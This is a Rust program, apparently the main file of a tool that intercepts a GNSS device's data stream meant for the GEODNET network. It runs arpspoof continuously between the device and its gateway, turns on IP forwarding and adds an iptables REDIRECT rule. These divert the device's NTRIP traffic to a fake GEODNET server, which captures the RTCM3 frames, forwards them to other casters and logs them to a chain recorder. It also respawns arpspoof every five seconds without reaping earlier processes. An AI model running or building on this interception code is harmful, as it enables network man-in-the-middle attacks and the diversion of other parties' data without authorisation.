mod caster;
mod chain;
mod config;
mod rtcm3;

use crate::config::Config;
use anyhow::Result;
use std::sync::{Arc, Mutex};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::process::Command;
use tracing::{info, warn};

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive("btcpc_gnss_capture=info".parse()?)
                .add_directive("warn".parse()?),
        )
        .init();

    let config = Config::from_env();

    info!("BTCPC GNSS Capture v0.1.0");
    info!("device: {}  geodnet: {}:{}", config.device_ip, config.geodnet_ip, config.geodnet_port);
    info!("listen port: {}  miner: {}  chain interval: {} frames",
        config.listen_port, config.miner, config.chain_interval);
    if config.forward { info!("caster forwarding: enabled"); }

    let arp_procs: Arc<Mutex<Vec<tokio::process::Child>>> = Arc::new(Mutex::new(Vec::new()));

    // ARP spoof — runs continuously, restarts on exit
    if config.arp_spoof && !config.gateway_ip.is_empty() {
        info!("ARP spoof: {} ↔ {} on {}", config.device_ip, config.gateway_ip, config.iface);
        if let Err(e) = enable_ip_forward() { warn!("ip_forward: {e}"); }
        install_dnat(&config);
        spawn_arp_loop(config.iface.clone(), config.device_ip.clone(),
            config.gateway_ip.clone(), Arc::clone(&arp_procs));
    } else {
        install_dnat(&config);
    }

    // Spawn NTRIP caster forwarding tasks
    let caster_txs: Vec<caster::FrameSender> = config.casters.iter()
        .filter(|c| c.enabled)
        .map(|c| caster::spawn_caster(c.clone()))
        .collect();

    let listener = TcpListener::bind(("0.0.0.0", config.listen_port)).await?;
    info!("Fake GEODNET server listening on :{}", config.listen_port);

    // Clone config for cleanup task
    let cleanup_config = config.clone();
    let cleanup_procs = Arc::clone(&arp_procs);
    tokio::spawn(async move {
        shutdown_signal().await;
        info!("Shutting down — removing DNAT");
        remove_dnat(&cleanup_config);
        let mut procs = cleanup_procs.lock().unwrap();
        for p in procs.iter_mut() { let _ = p.start_kill(); }
        std::process::exit(0);
    });

    loop {
        let (socket, addr) = listener.accept().await?;
        info!("NTRIP connection from {}", addr);
        let cfg = config.clone();
        let txs = caster_txs.clone();
        tokio::spawn(handle_connection(socket, cfg, txs));
    }
}

async fn handle_connection(
    mut socket: tokio::net::TcpStream,
    config: Config,
    caster_txs: Vec<caster::FrameSender>,
) {
    let mut buf: Vec<u8> = Vec::new();
    let mut raw = [0u8; 8192];
    let mut ntrip_acked = false;
    let mut frame_count: u64 = 0;
    let mut total_bytes: u64 = 0;
    let mut recorder = chain::ChainRecorder::new(config.clone());

    loop {
        match socket.read(&mut raw).await {
            Ok(0) => { info!("NTRIP client disconnected"); break; }
            Ok(n) => {
                buf.extend_from_slice(&raw[..n]);

                if !ntrip_acked {
                    if let Some(pos) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                        if socket.write_all(b"ICY 200 OK\r\n\r\n").await.is_err() { break; }
                        ntrip_acked = true;
                        info!("NTRIP handshake complete — streaming RTCM3");
                        buf.drain(..pos + 4);
                    }
                    continue;
                }

                for frame in rtcm3::parse_frames(&mut buf) {
                    frame_count += 1;
                    total_bytes += frame.payload_bytes as u64;

                    for tx in &caster_txs {
                        let _ = tx.try_send(frame.raw.clone());
                    }

                    if frame_count % config.chain_interval as u64 == 0 {
                        info!("frames={} bytes={} type={}", frame_count, total_bytes, frame.msg_type);
                        recorder.record(frame.msg_type, frame.payload_bytes).await;
                    }
                }
            }
            Err(e) => { warn!("socket read: {}", e); break; }
        }
    }
}

fn install_dnat(cfg: &Config) {
    let rule = dnat_rule(cfg);
    let status = std::process::Command::new("iptables")
        .args(&rule).status();
    match status {
        Ok(s) if s.success() => info!(
            "DNAT: {}→{}:{} → localhost:{}",
            cfg.device_ip, cfg.geodnet_ip, cfg.geodnet_port, cfg.listen_port
        ),
        Ok(_)  => warn!("iptables DNAT install failed (check permissions)"),
        Err(e) => warn!("iptables: {e}"),
    }
}

fn remove_dnat(cfg: &Config) {
    let mut rule = dnat_rule(cfg);
    // Replace -A with -D to delete
    if let Some(pos) = rule.iter().position(|s| s == "-A") {
        rule[pos] = "-D".to_string();
    }
    let _ = std::process::Command::new("iptables").args(&rule).status();
}

fn dnat_rule(cfg: &Config) -> Vec<String> {
    vec![
        "-t".into(), "nat".into(), "-A".into(), "PREROUTING".into(),
        "-i".into(), cfg.iface.clone(),
        "-p".into(), "tcp".into(),
        "-s".into(), cfg.device_ip.clone(),
        "-d".into(), cfg.geodnet_ip.clone(),
        "--dport".into(), cfg.geodnet_port.to_string(),
        "-j".into(), "REDIRECT".into(),
        "--to-ports".into(), cfg.listen_port.to_string(),
    ]
}

fn enable_ip_forward() -> Result<()> {
    std::fs::write("/proc/sys/net/ipv4/ip_forward", "1")?;
    Ok(())
}

fn spawn_arp_loop(
    iface: String, device_ip: String, gateway_ip: String,
    procs: Arc<Mutex<Vec<tokio::process::Child>>>,
) {
    for (target, host) in [
        (device_ip.clone(), gateway_ip.clone()),
        (gateway_ip.clone(), device_ip.clone()),
    ] {
        let iface = iface.clone();
        let procs = Arc::clone(&procs);
        tokio::spawn(async move {
            loop {
                match Command::new("arpspoof")
                    .args(["-i", &iface, "-t", &target, &host])
                    .stdin(std::process::Stdio::null())
                    .stdout(std::process::Stdio::null())
                    .stderr(std::process::Stdio::null())
                    .spawn()
                {
                    Ok(child) => {
                        procs.lock().unwrap().push(child);
                        // Wait for it to exit then respawn
                        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                    }
                    Err(e) => {
                        warn!("arpspoof: {e} — apt-get install dsniff");
                        tokio::time::sleep(std::time::Duration::from_secs(30)).await;
                    }
                }
            }
        });
    }
}

async fn shutdown_signal() {
    use tokio::signal;
    let ctrl_c = async { signal::ctrl_c().await.expect("ctrl_c") };
    #[cfg(unix)]
    let sigterm = async {
        signal::unix::signal(signal::unix::SignalKind::terminate())
            .expect("sigterm")
            .recv()
            .await
    };
    #[cfg(not(unix))]
    let sigterm = std::future::pending::<()>();
    tokio::select! {
        _ = ctrl_c => {}
        _ = sigterm => {}
    }
}
